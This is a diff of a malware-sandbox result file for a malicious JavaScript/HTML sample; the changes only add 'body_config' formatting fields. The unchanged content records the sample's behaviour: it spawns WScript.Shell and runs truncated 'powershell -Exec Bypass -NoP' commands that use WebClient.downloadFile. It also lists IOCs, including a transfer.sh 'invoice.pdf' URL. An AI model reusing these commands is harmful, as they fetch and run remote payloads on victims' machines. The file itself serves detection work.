@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -17,6 +18,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript creates an ActiveXObject\n\t\tActiveXObject(WScript.Shell)\n\n\t\tvar gref = ActiveXObject",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -39,6 +41,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript appends a child object to the document and clicks it\n\t\t  document.getElementById(\"xz\").click()",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -61,6 +64,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[17]()\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -83,6 +87,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs elevated PowerShell via powershell.exe\n\t\tHTMLImageElement[13].alt = (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.webclien...\n\t\tHTMLImageElement[13].alt.get() => (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.w...\n\t\tHTMLImageElement[13].getAttribute(alt) => (string) 'powershell -Exec Bypass -NoP -C (new-object syst...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\txt6ymmvzakvzm80nm6gllm5m_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object sys...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -105,6 +110,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs PowerShell via powershell.exe\n\t\tHTMLImageElement[13].alt = (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.webclien...\n\t\tHTMLImageElement[13].alt.get() => (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.w...\n\t\tHTMLImageElement[13].getAttribute(alt) => (string) 'powershell -Exec Bypass -NoP -C (new-object syst...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\txt6ymmvzakvzm80nm6gllm5m_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object sys...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -127,6 +133,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs PowerShell via powershell.exe with no profile\n\t\tHTMLImageElement[13].alt = (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.webclien...\n\t\tHTMLImageElement[13].alt.get() => (string) 'powershell -Exec Bypass -NoP -C (new-object system.net.w...\n\t\tHTMLImageElement[13].getAttribute(alt) => (string) 'powershell -Exec Bypass -NoP -C (new-object syst...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\txt6ymmvzakvzm80nm6gllm5m_jsjaws.setAttribute(\"alt\", \"powershell -Exec Bypass -NoP -C (new-object sys...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -149,6 +156,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs PowerShell to call out to a URI\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -171,6 +179,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs code via shell\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[17].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -193,6 +202,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript attempts to sleep\n\t\twindow[4].setTimeout(function(){?    var ts = document.getElementsByTagName(\"input\");?    for(var i ...",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -215,6 +225,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"abc.xyz\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://abc.xyz/img/bg-cropped.jpg\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/img/bg-cropped.jpg\"}, {\"ioc_type\": \"domain\", \"ioc\": \"transfer.sh\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://transfer.sh/get/vpihmi/invoice.pdf\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/get/vpihmi/invoice.pdf\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -250,6 +266,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"transfer.sh\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://transfer.sh/get/vpihmi/invoice.pdf\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/get/vpihmi/invoice.pdf\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -284,6 +306,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"url\": \"https://abc.xyz/img/bg-cropped.jpg\", \"method\": \"get\"}]",
+        "body_config": {
+          "column_order": [
+            "url",
+            "method"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
